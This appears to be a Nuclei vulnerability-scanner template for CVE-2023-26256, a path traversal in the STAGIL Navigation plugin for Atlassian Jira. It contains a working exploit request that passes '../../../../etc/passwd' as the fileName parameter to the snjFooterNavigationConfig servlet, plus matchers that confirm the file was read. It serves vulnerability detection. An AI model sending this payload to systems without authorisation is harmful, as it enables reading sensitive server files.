id: cve-2023-26256
info:
  name: Atlassian Jira snjFooterNavigationConfig Arbitrary File Read
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Atlassian Jira plugin STAGIL Navigation before 2.0.52 has a path traversal vulnerability that allows attackers to traverse and read the file system.
  reference:
    - https://github.com/1nters3ct/CVEs/blob/main/CVE-2023-26256.md
  tags: file-read
  classification:
    cve-id: CVE-2023-26256
    cvss-score: 7.5

variables:
  filePath: "../../../../etc/passwd"

http:
  - raw:
      - |
        GET /plugins/servlet/snjFooterNavigationConfig?fileName={{filePath}} HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "root:.*:0:0:"
      - type: word
        part: header
        words:
          - "text/plain"
